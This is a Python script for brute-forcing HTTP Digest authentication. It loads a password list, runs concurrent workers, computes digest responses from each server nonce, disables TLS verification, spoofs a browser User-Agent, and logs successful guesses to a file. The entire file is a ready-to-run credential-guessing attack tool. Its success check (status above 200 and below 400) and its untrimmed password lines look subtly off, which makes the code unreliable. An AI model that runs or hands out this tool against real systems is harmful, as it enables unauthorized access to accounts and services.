import requests
import math
import hashlib
from typing import List
import asyncio
import time
import argparse
import json

requests.packages.urllib3.disable_warnings() 

parser = argparse.ArgumentParser(
    prog='HTTP Digest Auth Brute Forcer', usage='main.py -t https://example.com -f password_list.txt -c 1 --username admin -r realm --uri / --algo MD5 -m GET --json myjsonfile.txt')
parser.add_argument('-t', '--target')
parser.add_argument('-f', '--file')
parser.add_argument('-c', '--concurrent',
                    help='Amount of concurrent requests', default='1')
parser.add_argument('-u', '--username')
parser.add_argument('-r', '--realm')
parser.add_argument('--uri', '--endpoint', help='The authentication uri')
parser.add_argument('-a', '--algo', help="MD5 or SHA256")
parser.add_argument('-m', '--method', help="GET OR POST (json)")
parser.add_argument('--json', help="file that contains json data to use with post request", default="")


async def main(target: str, file: str, concurrent_requests: int, username: str, realm: str, uri: str, method: str, algo: str, json_file: str):
    print("Starting brute force attack")
    print("---------------------------")
    with open(f'{file}', 'r') as f:
        lines = f.readlines()
    items_per_chunk = math.floor(len(lines) / concurrent_requests)
    line_chunks = chunks(lines, items_per_chunk)
    loop = asyncio.get_event_loop()
    tasks = []
    json_body = None
    if len(json_file) > 0:
        with open(json_file, "r") as f:
            json_body = f.read()
    for c in line_chunks:
        tasks.append(loop.run_in_executor(None, execute_lines,
                     c, target, username, realm, uri, method, algo, json_body))
        print("Thread started")
    await asyncio.gather(*tasks)


def chunks(xs, n):
    n = max(1, n)
    return [xs[i:i+n] for i in range(0, len(xs), n)]


def execute_lines(lines: List[str], target: str, username: str, realm: str, uri: str, method: str, algo: str, json_body: str):
    print(json_body)
    BASE_URL = f"{target}"
    headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}
    for l in lines:
        res = None
        if method.upper() == 'GET':
            res = requests.get(
                f"{BASE_URL}", headers=headers, verify=False)
        elif method.upper() == 'POST':
            headers.update({"Content-Type": "application/json"})
            res = requests.post(
                f"{BASE_URL}", json=json.loads(json_body), headers=headers, verify=False)
        else:
            raise RuntimeError("Currently only GET and POST is implemented")
        nonce_header = None
        for h in res.headers.keys():
            header_value = res.headers.get(h)
            if "digest" in header_value.lower():
                nonce_header = header_value
        nonce = nonce_header.split("nonce=")[1].split("\"")[1]
        opaque = nonce_header.split("opaque=")[1].split("\"")[1]
        cnonce = "8d34ac326d80e093"
        h1 = calc_hash_digest(algo, f"{username}:{realm}:{l}")
        h2 = calc_hash_digest(algo, f"{method.upper()}:{uri}")
        hashed_response = calc_hash_digest(
            algo, f"{h1}:{nonce}:00000001:{cnonce}:auth:{h2}")
        authorization_header = {
            "Authorization": f'Digest username="{username}", realm="{realm}", nonce="{nonce}", uri="{uri}", algorithm={algo.upper()}, response="{hashed_response}", qop=auth, nc=00000001, cnonce="{cnonce}", opaque="{opaque}"'
        }
        updated_headers = {}
        updated_headers.update(authorization_header)
        updated_headers.update(headers)
        if method.upper() == 'GET':
            res = requests.get(
                f"{BASE_URL}", headers=updated_headers, verify=False)
        elif method.upper() == 'POST':
            res = requests.post(f"{BASE_URL}", json=json.loads(json_body), headers=updated_headers, verify=False)
        else:
            raise RuntimeError("Currently only GET and POST is implemented")
        if res.status_code > 200 and res.status_code < 400:
            print("!!! password was found")
            with open(f'found.txt', 'a') as f:
                f.write(l)


def calc_hash_digest(algo: str, text: str):
    digest = ""
    if algo.lower() == 'md5':
        digest = hashlib.md5(text.encode()).hexdigest()
    elif algo.lower() == 'sha-256' or algo.lower() == 'sha256':
        digest = hashlib.sha256(text.encode()).hexdigest()
    else:
        raise RuntimeError("Algorithm not supported")
    return digest


if __name__ == '__main__':
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    start = round(time.time() * 1000)
    loop.run_until_complete(main(args.target, args.file, int(
        args.concurrent), args.username, args.realm, args.uri, args.method, args.algo, args.json))
    stop = round(time.time() * 1000)
    print(f"Brute force attempt took {str(stop-start)}ms")
